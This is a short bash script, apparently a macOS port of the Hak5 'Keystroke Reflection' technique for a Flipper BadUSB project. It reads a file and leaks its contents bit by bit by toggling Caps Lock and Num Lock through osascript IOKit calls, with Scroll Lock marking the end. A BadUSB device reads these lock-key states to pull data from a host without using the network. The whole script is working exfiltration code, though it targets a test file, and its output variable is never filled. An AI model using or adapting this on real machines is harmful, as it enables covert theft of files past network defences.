# Hak5 Windows Keystroke Reflection
# converted for macOS
# https://cdn.shopify.com/s/files/1/0068/2142/files/hak5-whitepaper-keystroke-reflection.pdf?v=1659317977


# blank string to store final output
o=""

# slightly different options on macOS cat but functionally similar
t=$(cat -envt /Users/ecimino/git-clones/flipper-base/f-zero/badUSB/helloworld.txt)

## expanded implemenation of the powershell commmands from the original whitepaper
# loop over characters in cat output and store it in b; treat b as digits
for (( i=0; i<${#t}; i++ )); do
    b=${t:$i:1}
    b=$(printf "%d" "\"$b")

    # powershell knows to treat 0x* as hex but bash doesn't; provide the values by hand
    # for a in 0x80, 0x40, 0x20, 0x10, 0x08, 0x04, 0x02, 0x01...
    for a in 128 64 32 16 8 4 2 1; do
        
        # 3 parens for bash bitwise operations, this is bitwise AND
        if (((b & a)>0))
        then 
            # press and release caps lock
            osascript -l JavaScript -e 'ObjC.import("IOKit"); ObjC.import("CoreServices"); (() => { var ioConnect = Ref(); var state = Ref(); $.IOServiceOpen($.IOServiceGetMatchingService($.kIOMasterPortDefault, $.IOServiceMatching($.kIOHIDSystemClass)), $.mach_task_self_, $.kIOHIDParamConnectType, ioConnect); $.IOHIDGetModifierLockState(ioConnect, $.kIOHIDCapsLockState, state); $.IOHIDSetModifierLockState(ioConnect, $.kIOHIDCapsLockState, true); delay(0.05); $.IOHIDSetModifierLockState(ioConnect, $.kIOHIDCapsLockState, false); $.IOServiceClose(ioConnect); })();'
        else 
            # press and release num lock
            osascript -l JavaScript -e 'ObjC.import("IOKit"); ObjC.import("CoreServices"); (() => { var ioConnect = Ref(); var state = Ref(); $.IOServiceOpen($.IOServiceGetMatchingService($.kIOMasterPortDefault, $.IOServiceMatching($.kIOHIDSystemClass)), $.mach_task_self_, $.kIOHIDParamConnectType, ioConnect); $.IOHIDGetModifierLockState(ioConnect, $.kIOHIDNumLockState, state); $.IOHIDSetModifierLockState(ioConnect, $.kIOHIDNumLockState, true); delay(0.05); $.IOHIDSetModifierLockState(ioConnect, $.kIOHIDNumLockState, false); $.IOServiceClose(ioConnect); })();'
        fi;
    done
done

# press and release scroll lock
osascript -l JavaScript -e 'ObjC.import("IOKit"); ObjC.import("CoreServices"); (() => { var ioConnect = Ref(); var state = Ref(); $.IOServiceOpen($.IOServiceGetMatchingService($.kIOMasterPortDefault, $.IOServiceMatching($.kIOHIDSystemClass)), $.mach_task_self_, $.kIOHIDParamConnectType, ioConnect); $.IOHIDGetModifierLockState(ioConnect, $.kIOHIDScrollLockState, state); $.IOHIDSetModifierLockState(ioConnect, $.kIOHIDScrollLockState, true); delay(0.05); $.IOHIDSetModifierLockState(ioConnect, $.kIOHIDScrollLockState, false); $.IOServiceClose(ioConnect); })();'

# echo $o > thing.txt
echo $o
